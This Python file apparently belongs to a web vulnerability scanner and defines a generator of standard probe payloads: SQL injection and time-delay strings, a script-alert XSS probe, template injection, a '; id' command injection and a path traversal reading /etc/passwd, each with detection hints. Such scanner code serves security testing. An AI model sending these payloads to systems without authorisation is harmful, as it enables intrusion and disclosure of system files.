from typing import List
from core.injection.models import Payload

class PayloadGenerator:
    @staticmethod
    def generate_sql_payloads(parameter_type: str) -> List[Payload]:
        return [
            Payload(value="' OR '1'='1", expected_behavior="bypass", oracle_hints={"type": "differential"}),
            Payload(value="'; WAITFOR DELAY '0:0:5'--", expected_behavior="sleep 5s", oracle_hints={"type": "timing", "delay": 5})
        ]

    @staticmethod
    def generate_xss_payloads(context: str = "html") -> List[Payload]:
        return [
            Payload(value="<script>alert(1)</script>", expected_behavior="execution", oracle_hints={"type": "reflection"})
        ]

    @staticmethod
    def generate_ssti_payloads(engine: str = "jinja") -> List[Payload]:
        return [
            Payload(value="{{7*7}}", expected_behavior="evaluates to 49", oracle_hints={"type": "reflection", "expected": "49"})
        ]

    @staticmethod
    def generate_command_payloads() -> List[Payload]:
        return [
            Payload(value="; id", expected_behavior="executes id", oracle_hints={"type": "reflection", "expected": "uid="})
        ]

    @staticmethod
    def generate_path_traversal_payloads() -> List[Payload]:
        return [
            Payload(value="../../../../etc/passwd", expected_behavior="reads passwd", oracle_hints={"type": "reflection", "expected": "root:x:0:0"})
        ]
